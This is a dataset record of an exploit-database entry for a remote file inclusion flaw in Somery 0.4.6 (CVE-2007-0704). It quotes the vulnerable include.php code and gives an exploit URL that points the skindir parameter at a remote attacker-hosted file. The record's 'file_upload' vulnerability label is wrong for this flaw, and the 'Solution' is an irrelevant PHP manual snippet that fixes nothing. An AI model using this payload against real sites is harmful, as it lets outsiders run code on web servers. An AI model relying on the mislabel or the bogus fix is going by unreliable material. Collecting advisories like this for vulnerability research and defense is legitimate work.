{
  "id": "2329",
  "title": "Somery 0.4.6 - &#039;skin_dir&#039; Remote File Inclusion",
  "cve": "CVE-2007-0704",
  "vuln_type": "file_upload",
  "code": "Update:\r\n16:01 09/08/06\r\n\r\nSubject:\r\n\"Somery 0.4(skin_dir)Remote File Inclusion Exploit\"\r\n\r\nVulnerable version:\r\n Somery 0.4.6\r\n\r\nOperating System:\r\n- All OS\r\n\r\nVendor URL:\r\nRobin de Graaf - voh@hostvoh.net\r\nSomery website - http://somery.danwa.net\r\n\r\nDescription:\r\nSomery, also known as the Somery weblogging system.\r\n\r\nVulnerability:\r\nAn error accoured when sending a specified string code at include function\r\nVaribale scope at the line for request was not except how they handle failure.include() does not behave this way, the script will continue\r\n\r\nregardless.include() produces a Warning while require() results in a Fatal Error.\r\nsee vulnerability script;\r\n\r\n// upload/admin/system/include.php\r\n\r\nif ($start) {\r\n       include(\"../config.php\");\r\n       include(\"cookies.php\");\r\n       include(\"system/error.php\");\r\n       include(\"system/functions.php\");\r\n       include(\"system/authorization.php\");\r\n       include(\"$skindir/header.php\"); // is invalid code\r\n} else {\r\n       if (!$checkauth) {\r\n               $login = TRUE;\r\n               include(\"login.php\");\r\n       }\r\n       include(\"$skindir/footer.php\"); // is invalid code\r\n}\r\n\r\nExploit:\r\n//          =============XCRIME-CYBER============\r\n//          Somery 0.4(skin_dir)Remote File Inclusion Exploit\r\n//          ======================================\r\n//                              basher13 - Infam0us Gr0up\r\nUsage:\r\nhttp://[domain]/[path]/upload/admin/system/include.php?skindir=http://[url_inclusion_exploit]\r\n\r\nSolution:\r\nPHP Manual(PHP 3, PHP 4, PHP 5)\r\nDefined --  Checks whether a given named constant exists\r\n<?php\r\n/* Note the use of quotes, this is important.  This example is checking\r\n * if the string 'CONSTANT' is the name of a constant named CONSTANT */\r\nif (defined('CONSTANT')) {\r\n   echo CONSTANT;\r\n}\r\n?>\r\n\r\nPublished by:\r\nbasher13 (Infam0us Gr0up - Securiti Research)\r\nbasher13@linuxmail.org / www.xcrime-cyber.pro.tc\r\n\r\n# milw0rm.com [2006-09-08]",
  "url": "https://www.exploit-db.com/exploits/2329"
}